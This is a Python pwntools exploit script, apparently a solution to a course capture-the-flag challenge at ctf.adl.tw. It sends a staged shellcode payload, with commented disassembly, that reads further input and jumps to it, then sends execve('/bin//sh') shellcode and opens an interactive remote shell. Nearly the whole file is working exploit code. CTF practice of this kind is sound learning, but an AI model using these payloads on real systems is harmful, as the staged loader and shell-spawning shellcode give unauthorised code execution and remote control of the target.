#!/usr/bin/python3
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = 'amd64'

# p = process('./distribute/share/peko')
p = remote('ctf.adl.tw', 10002)

payload = b'\x90\x90\x90\xeb\x01\x87\x49\x89\xD7\x48\x31\xFF\xeb\x03\x90\x90\x87\x49\x83\xC7\x50\x4C\x89\xfe\xeb\x02\x90\x87\x48\xC7\xC2\xFF\xFF\x00\x00\xeb\x02\x90\x87\x48\x31\xC0\x0F\x05\x41\xFF\xE7'
# payload = '
# \x90\x90\x90\xeb\x02\x87
# \x49\x89\xD7                          mov r15, rdx
# \x48\x31\xFF                          xor rdi,rdi
# \xeb\x03\x90\x90\x87                  jmp
# \x49\x83\xC7\x50                      add r15, 0x50
# \x4C\x89\xFE                          mov rsi, r15
# \xeb\x02\x90\x87                      jmp
# \x48\xC7\xC2\xFF\xFF\x00\x00          mov rdx, 0xffff
# \xeb\x02\x90\x87                      jmp
# \x48\x31\xC0                          xor rax,rax
# \x0F\x05                              syscall
# \x41\xFF\xE7                          jmp    r15

payload = payload + b'\x87' * (64-len(payload))

p.sendafter("I think pekora is the best VTuber. Isn't it?\n", "yes")

p.sendafter("You will pass the course.\n", payload)

payload = asm('''
    xor rax, rax
    push rax
    mov rax, 0x68732f2f6e69622f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    xor rax, rax
    add al, 59
    syscall
''')

p.sendline(payload)

p.interactive()
